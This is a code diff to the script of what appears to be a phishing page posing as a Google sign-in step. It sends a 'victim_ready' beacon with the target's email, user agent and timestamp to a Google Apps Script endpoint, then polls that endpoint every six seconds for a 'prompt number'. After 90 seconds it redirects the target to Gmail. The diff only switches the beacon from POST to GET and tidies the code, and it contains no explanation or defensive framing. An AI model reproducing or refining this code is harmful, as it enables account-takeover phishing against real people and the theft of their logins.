@@ -48,7 +48,7 @@
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwWsCzMgnP9a06RF1albWCtppqmaLegtWoqy6geMcU9nWw1RjUw__yyZ1u8CThcOQc/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyP9Jpi4OZYr7aXSc9_Rfv3_QU5VuvBEj5yvQS9QuXaSckE1gZzQOGwgwNbp-NJsj7j/exec";
 
     let email = localStorage.getItem("demoEmail") || "someone@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
@@ -61,28 +61,26 @@
       debugEl.textContent = msg; 
     }
 
-    // Send victim_ready signal
+    // Send victim_ready signal using GET
     const readyParams = new URLSearchParams({
       action: "victim_ready",
       email: email,
-      user_agent: navigator.userAgent,
+      user_agent: navigator.userAgent || "Unknown",
       timestamp: new Date().toISOString()
     });
 
-    fetch(SCRIPT_URL, {
-      method: "POST",
-      headers: { "Content-Type": "text/plain;charset=utf-8" },
-      body: readyParams.toString(),
+    fetch(`${SCRIPT_URL}?${readyParams.toString()}`, {
+      method: "GET",
       mode: "no-cors",
-      keepalive: true
+      cache: "no-cache"
     })
     .then(() => {
-      console.log("victim_ready signal sent (optimistic)");
-      log("Ready signal sent");
+      log("Ready signal sent (GET)");
+      console.log("victim_ready GET sent");
     })
     .catch(e => {
-      console.error("victim_ready fetch failed:", e);
-      log("Ready signal failed");
+      log("Ready signal failed (GET): " + e);
+      console.error("victim_ready GET failed:", e);
     });
 
     // Poll for prompt number
@@ -102,12 +100,9 @@
     }, 6000);
 
     // Timeout redirect
-    setTimeout(() => {
-      window.location.href = "https://mail.google.com/";
-    }, 90000);
+    setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
   </script>
 </body>
-</html>
 
+  </html>
 
-  
